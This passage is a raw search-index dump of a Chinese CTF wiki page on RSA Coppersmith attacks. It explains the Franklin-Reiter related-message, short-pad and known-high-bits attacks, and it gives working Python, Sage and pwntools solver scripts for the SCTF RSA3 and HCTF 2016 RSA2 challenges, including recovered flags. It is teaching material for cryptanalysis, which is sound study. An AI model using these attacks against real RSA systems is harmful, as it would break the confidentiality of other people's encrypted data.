easy_fs","title":"\u9898\u76ee"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#broadcast-attack-with-linear-padding","text":"\u5bf9\u4e8e\u5177\u6709\u7ebf\u6027\u586b\u5145\u7684\u60c5\u51b5\u4e0b\uff0c\u4ecd\u7136\u53ef\u4ee5\u653b\u51fb\uff0c\u8fd9\u65f6\u5019\u5c31\u4f1a\u4f7f\u7528 Coppersmith method \u7684\u65b9\u6cd5\u4e86\uff0c\u8fd9\u91cc\u6682\u4e0d\u4ecb\u7ecd\u3002\u53ef\u4ee5\u53c2\u8003 https://en.wikipedia.org/wiki/Coppersmith%27s_attack#Generalizations","title":"Broadcast Attack with Linear Padding"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#related-message-attack","text":"","title":"Related Message Attack"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_5","text":"\u5f53 Alice \u4f7f\u7528\u540c\u4e00\u516c\u94a5\u5bf9\u4e24\u4e2a\u5177\u6709\u67d0\u79cd\u7ebf\u6027\u5173\u7cfb\u7684\u6d88\u606f M1 \u4e0e M2 \u8fdb\u884c\u52a0\u5bc6\uff0c\u5e76\u5c06\u52a0\u5bc6\u540e\u7684\u6d88\u606f C1\uff0cC2 \u53d1\u9001\u7ed9\u4e86 Bob \u65f6\uff0c\u6211\u4eec\u5c31\u53ef\u80fd\u53ef\u4ee5\u83b7\u5f97\u5bf9\u5e94\u7684\u6d88\u606f M1 \u4e0e M2\u3002\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\u6a21\u6570\u4e3a N\uff0c\u4e24\u8005\u4e4b\u95f4\u7684\u7ebf\u6027\u5173\u7cfb\u5982\u4e0b M_1 \\equiv f(M_2) \\bmod N M_1 \\equiv f(M_2) \\bmod N \u5176\u4e2d f \u4e3a\u4e00\u4e2a\u7ebf\u6027\u51fd\u6570\uff0c\u6bd4\u5982\u8bf4 f=ax+b f=ax+b \u3002 \u5728\u5177\u6709\u8f83\u5c0f\u9519\u8bef\u6982\u7387\u4e0b\u7684\u60c5\u51b5\u4e0b\uff0c\u5176\u590d\u6742\u5ea6\u4e3a O(elog^2N) O(elog^2N) \u3002 \u8fd9\u4e00\u653b\u51fb\u7531 Franklin\uff0cReiter \u63d0\u51fa\u3002","title":"\u653b\u51fb\u6761\u4ef6"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_6","text":"\u9996\u5148\uff0c\u6211\u4eec\u77e5\u9053 C_1 \\equiv M_1 ^e \\bmod N C_1 \\equiv M_1 ^e \\bmod N \uff0c\u5e76\u4e14 M_1 \\equiv f(M_2) \\bmod N M_1 \\equiv f(M_2) \\bmod N \uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u77e5\u9053 M_2 M_2 \u662f f(x)^e \\equiv C_1 \\bmod N f(x)^e \\equiv C_1 \\bmod N \u7684\u4e00\u4e2a\u89e3\uff0c\u5373\u5b83\u662f\u65b9\u7a0b f(x)^e-C_1 f(x)^e-C_1 \u5728\u6a21 N \u610f\u4e49\u4e0b\u7684\u4e00\u4e2a\u6839\u3002\u540c\u6837\u7684\uff0c M_2 M_2 \u662f x^e - C_2 x^e - C_2 \u5728\u6a21 N \u610f\u4e49\u4e0b\u7684\u4e00\u4e2a\u6839\u3002\u6240\u4ee5\u8bf4 x-M_2 x-M_2 \u540c\u65f6\u6574\u9664\u4ee5\u4e0a\u4e24\u4e2a\u591a\u9879\u5f0f\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u6c42\u5f97\u4e24\u4e2a\u591a\u9879\u5f0f\u7684\u6700\u5927\u516c\u56e0\u5b50\uff0c\u5982\u679c\u6700\u5927\u516c\u56e0\u5b50\u6070\u597d\u662f\u7ebf\u6027\u7684\u8bdd\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u6c42\u5f97\u4e86 M_2 M_2 \u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728 e=3 e=3 \u7684\u60c5\u51b5\u4e0b\uff0c\u6700\u5927\u516c\u56e0\u5b50\u4e00\u5b9a\u662f\u7ebf\u6027\u7684\u3002 \u8fd9\u91cc\u6211\u4eec\u5173\u6ce8\u4e00\u4e0b e=3 e=3 \uff0c\u4e14 f(x)=ax+b f(x)=ax+b \u7684\u60c5\u51b5\u3002\u9996\u5148\u6211\u4eec\u6709 C_1 \\equiv M_1 ^3 \\bmod N,M_1 \\equiv aM_2+b \\bmod N C_1 \\equiv M_1 ^3 \\bmod N,M_1 \\equiv aM_2+b \\bmod N \u90a3\u4e48\u6211\u4eec\u6709 C_1 \\equiv (aM_2+b)^3 \\bmod N,C_2 \\equiv M_2^3 \\bmod N C_1 \\equiv (aM_2+b)^3 \\bmod N,C_2 \\equiv M_2^3 \\bmod N \u6211\u4eec\u9700\u8981\u660e\u786e\u4e00\u4e0b\u6211\u4eec\u60f3\u8981\u5f97\u5230\u7684\u662f\u6d88\u606f m\uff0c\u6240\u4ee5\u9700\u8981\u5c06\u5176\u5355\u72ec\u6784\u9020\u51fa\u6765\u3002 \u9996\u5148\uff0c\u6211\u4eec\u6709\u5f0f 1 (aM_2+b)^3=a^3M_2^3+3a^2M^2b+3aM_2b^2+b^3 (aM_2+b)^3=a^3M_2^3+3a^2M^2b+3aM_2b^2+b^3 \u518d\u8005\u6211\u4eec\u6784\u9020\u5982\u4e0b\u5f0f 2 (aM_2)^3-b^3 \\equiv (aM_2-b)(a^2M_2^2+aM_2b+b^2) \\bmod N (aM_2)^3-b^3 \\equiv (aM_2-b)(a^2M_2^2+aM_2b+b^2) \\bmod N \u6839\u636e\u5f0f 1 \u6211\u4eec\u6709 a^3M_2^3-2b^3+3b(a^2M_2^2+aM_2b+b^2) \\equiv C_1 \\bmod N a^3M_2^3-2b^3+3b(a^2M_2^2+aM_2b+b^2) \\equiv C_1 \\bmod N \u7ee7\u800c\u6211\u4eec\u6709\u5f0f 3 3b(a^2M_2^2+aM_2b+b^2) \\equiv C_1-a^3C_2+2b^3 \\bmod N 3b(a^2M_2^2+aM_2b+b^2) \\equiv C_1-a^3C_2+2b^3 \\bmod N \u90a3\u4e48\u6211\u4eec\u6839\u636e\u5f0f 2 \u4e0e\u5f0f 3 \u53ef\u5f97 (a^3C_2-b^3)*3b \\equiv (aM_2-b)( C_1-a^3C_2+2b^3 ) \\bmod N (a^3C_2-b^3)*3b \\equiv (aM_2-b)( C_1-a^3C_2+2b^3 ) \\bmod N \u8fdb\u800c\u6211\u4eec\u6709 aM_2-b=\\frac{3a^3bC_2-3b^4}{C_1-a^3C_2+2b^3} aM_2-b=\\frac{3a^3bC_2-3b^4}{C_1-a^3C_2+2b^3} \u8fdb\u800c aM_2\\equiv \\frac{2a^3bC_2-b^4+C_1b}{C_1-a^3C_2+2b^3} aM_2\\equiv \\frac{2a^3bC_2-b^4+C_1b}{C_1-a^3C_2+2b^3} \u8fdb\u800c M_2 \\equiv\\frac{2a^3bC_2-b^4+C_1b}{aC_1-a^4C_2+2ab^3}=\\frac{b}{a}\\frac{C_1+2a^3C_2-b^3}{C_1-a^3C_2+2b^3} M_2 \\equiv\\frac{2a^3bC_2-b^4+C_1b}{aC_1-a^4C_2+2ab^3}=\\frac{b}{a}\\frac{C_1+2a^3C_2-b^3}{C_1-a^3C_2+2b^3} \u4e0a\u9762\u7684\u5f0f\u5b50\u4e2d\u53f3\u8fb9\u6240\u6709\u7684\u5185\u5bb9\u90fd\u662f\u5df2\u77e5\u7684\u5185\u5bb9\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u83b7\u53d6\u5bf9\u5e94\u7684\u6d88\u606f\u3002 \u6709\u5174\u8da3\u7684\u53ef\u4ee5\u8fdb\u4e00\u6b65\u9605\u8bfb A New Related Message Attack on RSA \u4ee5\u53ca paper \u8fd9\u91cc\u6682\u4e0d\u505a\u8fc7\u591a\u7684\u8bb2\u89e3\u3002","title":"\u653b\u51fb\u539f\u7406"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#sctf-rsa3","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5 SCTF RSA3 \u4e2d\u7684 level3 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u9996\u5148\uff0c\u8ddf\u8e2a TCP \u6d41\u53ef\u4ee5\u77e5\u9053\uff0c\u52a0\u5bc6\u65b9\u5f0f\u662f\u5c06\u660e\u6587\u52a0\u4e0a\u7528\u6237\u7684 user id \u8fdb\u884c\u52a0\u5bc6\uff0c\u800c\u4e14\u8fd8\u5b58\u5728\u591a\u7ec4\u3002\u8fd9\u91cc\u6211\u4eec\u9009\u62e9\u7b2c 0 \u7ec4\u548c\u7b2c 9 \u7ec4\uff0c\u4ed6\u4eec\u7684\u6a21\u6570\u4e00\u6837\uff0c\u89e3\u5bc6\u811a\u672c\u5982\u4e0b import gmpy2 id1 = 1002 id2 = 2614 c1 = 0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c5bb724d1cee07e221e028d9b8bc24360208840fbdfd4794733adcac45c38ad0225fde19a6a4c38e4207368f5902c871efdf1bdf4760b1a98ec1417893c8fce8389b6434c0fee73b13c284e8c9fb5c77e420a2b5b1a1c10b2a7a3545e95c1d47835c2718 L c2 = 0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c72722fe4fe5a901e2531b3dbcb87e5aa19bbceecbf9f32eacefe81777d9bdca781b1ec8f8b68799b4aa4c6ad120506222c7f0c3e11b37dd0ce08381fabf9c14bc74929bf524645989ae2df77c8608d0512c1cc4150765ab8350843b57a2464f848d8e08 L n = 25357901189172733149625332391537064578265003249917817682864120663898336510922113258397441378239342349767317285221295832462413300376704507936359046120943334215078540903962128719706077067557948218308700143138420408053500628616299338204718213283481833513373696170774425619886049408103217179262264003765695390547355624867951379789924247597370496546249898924648274419164899831191925127182066301237673243423539604219274397539786859420866329885285232179983055763704201023213087119895321260046617760702320473069743688778438854899409292527695993045482549594428191729963645157765855337481923730481041849389812984896044723939553 a = 1 b = id1 - id2 def getmessage ( a , b , c1 , c2 , n ): b3 = gmpy2 . powmod ( b , 3 , n ) part1 = b * ( c1 + 2 * c2 - b3 ) % n part2 = a * ( c1 - c2 + 2 * b3 ) % n part2 = gmpy2 . invert ( part2 , n ) return part1 * part2 % n message = getmessage ( a , b , c1 , c2 , n ) - id2 message = hex ( message )[ 2 :] if len ( message ) % 2 != 0 : message = '0' + message print message . decode ( 'hex' ) \u5f97\u5230\u660e\u6587 \u279c sctf-rsa3-level3 git: ( master ) \u2717 python exp.py F4An8LIn_rElT3r_rELa53d_Me33Age_aTtaCk_e_I2_s7aLL \u5f53\u7136\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 sage \u6765\u505a\uff0c\u4f1a\u66f4\u52a0\u7b80\u5355\u4e00\u70b9\u3002 import binascii def attack ( c1 , c2 , b , e , n ): PR .< x >= PolynomialRing ( Zmod ( n )) g1 = x ^ e - c1 g2 = ( x + b ) ^ e - c2 def gcd ( g1 , g2 ): while g2 : g1 , g2 = g2 , g1 % g2 return g1 . monic () return - gcd ( g1 , g2 )[ 0 ] c1 = 0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c5bb724d1cee07e221e028d9b8bc24360208840fbdfd4794733adcac45c38ad0225fde19a6a4c38e4207368f5902c871efdf1bdf4760b1a98ec1417893c8fce8389b6434c0fee73b13c284e8c9fb5c77e420a2b5b1a1c10b2a7a3545e95c1d47835c2718 L c2 = 0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c72722fe4fe5a901e2531b3dbcb87e5aa19bbceecbf9f32eacefe81777d9bdca781b1ec8f8b68799b4aa4c6ad120506222c7f0c3e11b37dd0ce08381fabf9c14bc74929bf524645989ae2df77c8608d0512c1cc4150765ab8350843b57a2464f848d8e08 L n = 25357901189172733149625332391537064578265003249917817682864120663898336510922113258397441378239342349767317285221295832462413300376704507936359046120943334215078540903962128719706077067557948218308700143138420408053500628616299338204718213283481833513373696170774425619886049408103217179262264003765695390547355624867951379789924247597370496546249898924648274419164899831191925127182066301237673243423539604219274397539786859420866329885285232179983055763704201023213087119895321260046617760702320473069743688778438854899409292527695993045482549594428191729963645157765855337481923730481041849389812984896044723939553 e = 3 a = 1 id1 = 1002 id2 = 2614 b = id2 - id1 m1 = attack ( c1 , c2 , b , e , n ) print binascii . unhexlify ( \" %x \" % int ( m1 - id1 )) \u7ed3\u679c\u5982\u4e0b \u279c sctf-rsa3-level3 git: ( master ) \u2717 sage exp.sage sys:1: RuntimeWarning: not adding directory '' to sys.path since everybody can write to it. Untrusted users could put files in this directory which might then be imported by your Python code. As a general precaution from similar exploits, you should not execute Python code from this directory F4An8LIn_rElT3r_rELa53d_Me33Age_aTtaCk_e_I2_s7aLL","title":"SCTF RSA3"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_7","text":"hitcon 2014 rsaha N1CTF 2018 rsa_padding","title":"\u9898\u76ee"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#coppersmiths-short-pad-attack","text":"","title":"Coppersmith\u2019s short-pad attack"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_8","text":"\u76ee\u524d\u5728\u5927\u90e8\u5206\u6d88\u606f\u52a0\u5bc6\u4e4b\u524d\u90fd\u4f1a\u8fdb\u884c padding\uff0c\u4f46\u662f\u5982\u679c padding \u7684\u957f\u5ea6\u8fc7\u77ed\uff0c\u4e5f\u6709 \u53ef\u80fd \u88ab\u5f88\u5bb9\u6613\u5730\u653b\u51fb\u3002 \u8fd9\u91cc\u6240\u8c13 padding \u8fc7\u77ed\uff0c\u5176\u5b9e\u5c31\u662f\u5bf9\u5e94\u7684\u591a\u9879\u5f0f\u7684\u6839\u4f1a\u8fc7\u5c0f\u3002","title":"\u653b\u51fb\u6761\u4ef6"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_9","text":"\u6211\u4eec\u5047\u8bbe\u7231\u4e3d\u4e1d\u8981\u7ed9\u9c8d\u52c3\u53d1\u9001\u6d88\u606f\uff0c\u9996\u5148\u7231\u4e3d\u4e1d\u5bf9\u8981\u52a0\u5bc6\u7684\u6d88\u606f M \u8fdb\u884c\u968f\u673a padding\uff0c\u7136\u540e\u52a0\u5bc6\u5f97\u5230\u5bc6\u6587 C1\uff0c\u53d1\u9001\u7ed9\u9c8d\u52c3\u3002\u8fd9\u65f6\uff0c\u4e2d\u95f4\u4eba\u76ae\u7279\u622a\u83b7\u4e86\u5bc6\u6587\u3002\u4e00\u6bb5\u65f6\u95f4\u540e\uff0c\u7231\u4e3d\u4e1d\u6ca1\u6709\u6536\u5230\u9c8d\u52c3\u7684\u56de\u590d\uff0c\u518d\u6b21\u5bf9\u8981\u52a0\u5bc6\u7684\u6d88\u606f M \u8fdb\u884c\u968f\u673a padding\uff0c\u7136\u540e\u52a0\u5bc6\u5f97\u5230\u5bc6\u6587 C2\uff0c\u53d1\u9001\u7ed9 Bob\u3002\u76ae\u7279\u518d\u4e00\u6b21\u622a\u83b7\u3002\u8fd9\u65f6\uff0c\u76ae\u7279\u5c31 \u53ef\u80fd \u53ef\u4ee5\u5229\u7528\u5982\u4e0b\u539f\u7406\u89e3\u5bc6\u3002 \u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\u6a21\u6570 N \u7684\u957f\u5ea6\u4e3a k\uff0c\u5e76\u4e14 padding \u7684\u957f\u5ea6\u4e3a m=\\lfloor \\frac{k}{e^2} \\rfloor m=\\lfloor \\frac{k}{e^2} \\rfloor \u3002\u6b64\u5916\uff0c\u5047\u8bbe\u8981\u52a0\u5bc6\u7684\u6d88\u606f\u7684\u957f\u5ea6\u6700\u591a\u4e3a k-m \u6bd4\u7279\uff0cpadding \u7684\u65b9\u5f0f\u5982\u4e0b M_1=2^mM+r_1, 0\\leq r_1\\leq 2^m M_1=2^mM+r_1, 0\\leq r_1\\leq 2^m \u6d88\u606f M2 \u7684 padding \u65b9\u5f0f\u7c7b\u4f3c\u3002 \u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u5982\u4e0b\u7684\u65b9\u5f0f\u6765\u89e3\u5bc6\u3002 \u9996\u5148\u5b9a\u4e49 g_1(x,y)=x^e-C_1 g_2(x,y)=(x+y)^e-C_2 g_1(x,y)=x^e-C_1 g_2(x,y)=(x+y)^e-C_2 \u5176\u4e2d y=r_2-r_1 y=r_2-r_1 \u3002\u663e\u7136\u8fd9\u4e24\u4e2a\u65b9\u7a0b\u5177\u6709\u76f8\u540c\u7684\u6839 M1\u3002\u7136\u540e\u8fd8\u6709\u4e00\u7cfb\u5217\u7684\u63a8\u5bfc\u3002","title":"\u653b\u51fb\u539f\u7406"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#known-high-bits-message-attack","text":"","title":"Known High Bits Message Attack"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_10","text":"\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\u6211\u4eec\u9996\u5148\u52a0\u5bc6\u4e86\u6d88\u606f m\uff0c\u5982\u4e0b C\\equiv m^d \\bmod N C\\equiv m^d \\bmod N \u5e76\u4e14\u6211\u4eec\u5047\u8bbe\u6211\u4eec\u77e5\u9053\u6d88\u606f m \u7684\u5f88\u5927\u7684\u4e00\u90e8\u5206 m_0 m_0 \uff0c\u5373 m=m_0+x m=m_0+x \uff0c\u4f46\u662f\u6211\u4eec\u4e0d\u77e5\u9053 x x \u3002\u90a3\u4e48\u6211\u4eec\u5c31\u6709\u53ef\u80fd\u901a\u8fc7\u8be5\u65b9\u6cd5\u8fdb\u884c\u6062\u590d\u6d88\u606f\u3002\u8fd9\u91cc\u6211\u4eec\u4e0d\u77e5\u9053\u7684 x \u5176\u5b9e\u5c31\u662f\u591a\u9879\u5f0f\u7684\u6839\uff0c\u9700\u8981\u6ee1\u8db3 Coppersmith \u7684\u7ea6\u675f\u3002 \u53ef\u4ee5\u53c2\u8003 https://github.com/mimoo/RSA-and-LLL-attacks \u3002","title":"\u653b\u51fb\u6761\u4ef6"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#factoring-with-high-bits-known","text":"","title":"Factoring with High Bits Known"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_11","text":"\u5f53\u6211\u4eec\u77e5\u9053\u4e00\u4e2a\u516c\u94a5\u4e2d\u6a21\u6570 N \u7684\u4e00\u4e2a\u56e0\u5b50\u7684\u8f83\u9ad8\u4f4d\u65f6\uff0c\u6211\u4eec\u5c31\u6709\u4e00\u5b9a\u51e0\u7387\u6765\u5206\u89e3 N\u3002","title":"\u653b\u51fb\u6761\u4ef6"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_12","text":"\u8bf7\u53c2\u8003 https://github.com/mimoo/RSA-and-LLL-attacks \u3002\u4e0a\u9762\u6709\u4f7f\u7528\u6559\u7a0b\u3002\u5173\u6ce8\u4e0b\u9762\u7684\u4ee3\u7801 beta = 0.5 dd = f . degree () epsilon = beta / 7 mm = ceil ( beta ** 2 / ( dd * epsilon )) tt = floor ( dd * mm * (( 1 / beta ) - 1 )) XX = ceil ( N ** (( beta ** 2 / dd ) - epsilon )) + 1000000000000000000000000000000000 roots = coppersmith_howgrave_univariate ( f , N , beta , mm , tt , XX ) \u5176\u4e2d\uff0c \u5fc5\u987b\u6ee1\u8db3 q\\geq N^{beta} q\\geq N^{beta} \uff0c\u6240\u4ee5\u8fd9\u91cc\u7ed9\u51fa\u4e86 beta=0.5 beta=0.5 \uff0c\u663e\u7136\u4e24\u4e2a\u56e0\u6570\u4e2d\u5fc5\u7136\u6709\u4e00\u4e2a\u662f\u5927\u4e8e\u7684\u3002 XX \u662f f(x)=q'+x f(x)=q'+x \u5728\u6a21 q \u610f\u4e49\u4e0b\u7684\u6839\u7684\u4e0a\u754c\uff0c\u81ea\u7136\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u8c03\u6574\u5b83\uff0c\u8fd9\u91cc\u5176\u5b9e\u4e5f\u8868\u660e\u4e86\u6211\u4eec\u5df2\u77e5\u7684 q' q' \u4e0e\u56e0\u6570 q \u4e4b\u95f4\u53ef\u80fd\u7684\u5dee\u8ddd\u3002","title":"\u653b\u51fb\u5de5\u5177"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#2016-hctf-rsa2","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5 2016 \u5e74 HCTF \u4e2d\u7684 RSA2 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002 \u9996\u5148\u7a0b\u5e8f\u7684\u5f00\u5934\u662f\u4e00\u4e2a\u7ed5\u8fc7\u9a8c\u8bc1\u7684\uff0c\u7ed5\u8fc7\u5373\u53ef\uff0c\u4ee3\u7801\u5982\u4e0b from pwn import * from hashlib import sha512 sh = remote ( '127.0.0.1' , 9999 ) context . log_level = 'debug' def sha512_proof ( prefix , verify ): i = 0 pading = \"\" while True : try : i = randint ( 0 , 1000 ) pading += str ( i ) if len ( pading ) > 200 : pading = pading [ 200 :] #print pading except StopIteration : break r = sha512 ( prefix + pading ) . hexdigest () if verify in r : return pading def verify (): sh . recvuntil ( \"Prefix: \" ) prefix = sh . recvline () print len ( prefix ) prefix = prefix [: - 1 ] prefix = prefix . decode ( 'base64' ) proof = sha512_proof ( prefix , \"fffffff\" ) sh . send ( proof . encode ( 'base64' )) if __name__ == '__main__' : verify () print 'verify success' sh . recvuntil ( \"token: \" ) token = \"5c9597f3c8245907ea71a89d9d39d08e\" sh . sendline ( token ) sh . recvuntil ( \"n: \" ) n = sh . readline () . strip () n = int ( n [ 2 :], 16 ) sh . recvuntil ( \"e: \" ) e = sh . readline () . strip () e = int ( e [ 2 :], 16 ) sh . recvuntil ( \"e2: \" ) e2 = sh . readline () . strip () e2 = int ( e2 [ 2 :], 16 ) sh . recvuntil ( \"is: \" ) enc_flag = sh . readline () . strip () enc_flag = int ( enc_flag [ 2 : - 1 ], 16 ) print \"n: \" , hex ( n ) print \"e: \" , hex ( e ) print \"e2: \" , hex ( e2 ) print \"flag: \" , hex ( enc_flag ) \u8fd9\u91cc\u6211\u4eec\u4e5f\u5df2\u7ecf\u5f97\u5230 n\uff0ce\uff0ce2\uff0c\u52a0\u5bc6\u540e\u7684 flag \u4e86\uff0c\u5982\u4e0b n : 0x724d41149e1bd9d2aa9b333d467f2dfa399049a5d0b4ee770c9d4883123be11a52ff1bd382ad37d0ff8d58c8224529ca21c86e8a97799a31ddebd246aeeaf0788099b9c9c718713561329a8e529dfeae993036921f036caa4bdba94843e0a2e1254c626abe54dc3129e2f6e6e73bbbd05e7c6c6e9f44fcd0a496f38218ab9d52bf1f266004180b6f5b9bee7988c4fe5ab85b664280c3cfe6b80ae67ed8ba37825758b24feb689ff247ee699ebcc4232b4495782596cd3f29a8ca9e0c2d86ea69372944d027a0f485cea42b74dfd74ec06f93b997a111c7e18017523baf0f57ae28126c8824bd962052623eb565cee0ceee97a35fd8815d2c5c97ab9653c4553f e : 0x10001 e2 : 0xf93b flag : 0xf11e932fa420790ca3976468dc4df1e6b20519ebfdc427c09e06940e1ef0ca566d41714dc1545ddbdcae626eb51c7fa52608384a36a2a021960d71023b5d0f63e6b38b46ac945ddafea42f01d24cc33ce16825df7aa61395d13617ae619dca2df15b5963c77d6ededf2fe06fd36ae8c5ce0e3c21d72f2d7f20cd9a8696fbb628df29299a6b836c418cbfe91e2b5be74bdfdb4efdd1b33f57ebb72c5246d5dce635529f1f69634d565a631e950d4a34a02281cbed177b5a624932c2bc02f0c8fd9afd332ccf93af5048f02b8bd72213d6a52930b0faa0926973883136d8530b8acf732aede8bb71cb187691ebd93a0ea8aeec7f82d0b8b74bcf010c8a38a1fa8 \u63a5\u4e0b\u6765\u6211\u4eec\u6765\u5206\u6790\u4e3b\u7a0b\u5e8f\u3002\u53ef\u4ee5\u770b\u51fa p , q , e = gen_key () n = p * q phi_n = ( p - 1 ) * ( q - 1 ) d = invmod ( e , phi_n ) while True : e2 = random . randint ( 0x1000 , 0x10000 ) if gcd ( e2 , phi_n ) == 1 : break \u6211\u4eec\u5f97\u5230\u7684 n=p \\times q n=p \\times q \u3002\u800c p\uff0cq \u4ee5\u53ca\u6211\u4eec\u5df2\u77e5\u7684 e \u90fd\u5728 gen_key \u51fd\u6570\u4e2d\u751f\u6210\u3002\u770b\u4e00\u770b gen_key \u51fd\u6570 def gen_key (): while True : p = getPrime ( k / 2 ) if gcd ( e , p - 1 ) == 1 : break q_t = getPrime ( k / 2 ) n_t = p * q_t t = get_bit ( n_t , k / 16 , 1 ) y = get_bit ( n_t , 5 * k / 8 , 0 ) p4 = get_bit ( p , 5 * k / 16 , 1 ) u = pi_b ( p4 , 1 ) n = bytes_to_long ( long_to_bytes ( t ) + long_to_bytes ( u ) + long_to_bytes ( y )) q = n / p if q % 2 == 0 : q += 1 while True : if isPrime ( q ) and gcd ( e , q - 1 ) == 1 : break m = getPrime ( k / 16 ) + 1 q ^= m return ( p , q , e ) \u5176\u4e2d\u6211\u4eec\u5df2\u77e5\u5982\u4e0b\u53c2\u6570 k=2048 e=0x10001 k=2048 e=0x10001 \u9996\u5148\uff0c\u7a0b\u5e8f\u5148\u5f97\u5230\u4e86 1024 \u6bd4\u7279\u4f4d\u7684\u7d20\u6570 p\uff0c\u5e76\u4e14 gcd(2,p-1)=1 \u3002 \u7136\u540e\uff0c\u7a0b\u5e8f\u53c8\u5f97\u5230\u4e86\u4e00\u4e2a 1024 \u6bd4\u7279\u4f4d\u7684\u7d20\u6570 q_t q_t \uff0c\u5e76\u4e14\u8ba1\u7b97 n_t=p \\times q_t n_t=p \\times q_t \u3002 \u4e0b\u9762\u591a\u6b21\u8c03\u7528\u4e86 get_bit \u51fd\u6570\uff0c\u6211\u4eec\u6765\u7b80\u5355\u5206\u6790\u4e00\u4e0b def get_bit ( number , n_bit , dire ): ''' dire: 1: left 0: right ''' if dire : sn = size ( number ) if sn % 8 != 0 : sn += ( 8 - sn % 8 ) return number >> ( sn - n_bit ) else : return number & ( pow ( 2 , n_bit ) - 1 ) \u53ef\u4ee5\u770b\u51fa\u6839\u636e dire(ction) \u7684\u4e0d\u540c\uff0c\u4f1a\u5f97\u5230\u4e0d\u540c\u7684\u6570 dire=1 \u65f6\uff0c\u7a0b\u5e8f\u9996\u5148\u8ba1\u7b97 number \u7684\u4e8c\u8fdb\u5236\u4f4d\u6570 sn \uff0c\u5982\u679c\u4e0d\u662f 8 \u7684\u6574\u6570\u500d\u7684\u8bdd\uff0c\u5c31\u5c06 sn \u589e\u5927\u4e3a 8 \u7684\u6574\u6570\u500d\uff0c\u7136\u540e\u8fd4\u56de number \u53f3\u79fb sn-n_bit \u7684\u6570\u5b57\u3002\u5176\u5b9e \u5c31\u662f\u6700\u591a\u4fdd\u7559 number \u7684 n_bit \u4f4d\u3002 dire=0 \u65f6\uff0c\u7a0b\u5e8f\u76f4\u63a5\u83b7\u53d6 number \u7684\u4f4e n_bit \u4f4d\u3002 \u7136\u540e\u6211\u4eec\u518d\u6765\u770b\u7a0b\u5e8f t = get_bit ( n_t , k / 16 , 1 ) y = get_bit ( n_t , 5 * k / 8 , 0 ) p4 = get_bit ( p , 5 * k / 16 , 1 ) \u8fd9\u4e09\u4e2a\u64cd\u4f5c\u5206\u522b\u505a\u4e86\u5982\u4e0b\u7684\u4e8b\u60c5 t \u4e3a n_t \u7684\u6700\u591a\u9ad8 k/16 \u4f4d\uff0c\u5373 128 \u4f4d\uff0c\u4f4d\u6570\u4e0d\u56fa\u5b9a\u3002 y \u4e3a n_t \u7684\u4f4e 5*k/8 \u4f4d\uff0c\u5373 1280 \u4f4d\uff0c\u4f4d\u6570\u56fa\u5b9a\u3002 p4 \u4e3a p \u7684\u6700\u591a\u9ad8 5*k/16 \u4f4d\uff0c\u5373 640 \u4f4d\uff0c\u4f4d\u6570\u4e0d\u56fa\u5b9a\u3002 \u6b64\u540e\uff0c\u7a0b\u5e8f\u6709\u5982\u4e0b\u64cd\u4f5c u = pi_b ( p4 , 1 ) \u5229\u7528 pi_b \u5bf9 p4 \u8fdb\u884c\u4e86\u52a0\u5bc6 def pi_b ( x , m ): ''' m: 1: encrypt 0: decrypt ''' enc = DES . new ( key ) if m : method = enc . encrypt else : method = enc . decrypt s = long_to_bytes ( x ) sp = [ s [ a : a + 8 ] for a in xrange ( 0 , len ( s ), 8 )] r = \"\" for a in sp : r += method ( a ) return bytes_to_long ( r ) \u5176\u4e2d\uff0c\u6211\u4eec\u5df2\u77e5\u4e86\u5bc6\u94a5 key\uff0c\u6240\u4ee5\u53ea\u8981\u6211\u4eec\u6709\u5bc6\u6587\u5c31\u53ef\u4ee5\u89e3\u5bc6\u3002\u6b64\u5916\uff0c\u53ef\u4ee5\u770b\u5230\u7684\u662f\u7a0b\u5e8f\u662f\u5bf9\u4f20\u5165\u7684\u6d88\u606f\u8fdb\u884c 8 \u5b57\u8282\u5206\u7ec4\uff0c\u91c7\u7528\u5bc6\u7801\u672c\u65b9\u5f0f\u52a0\u5bc6\uff0c\u6240\u4ee5\u5bc6\u6587\u4e4b\u95f4\u4e92\u4e0d\u5f71\u54cd\u3002 \u4e0b\u9762 n = bytes_to_long ( long_to_bytes ( t ) + long_to_bytes ( u ) + long_to_bytes ( y )) q = n / p if q % 2 == 0 : q += 1 while True : if 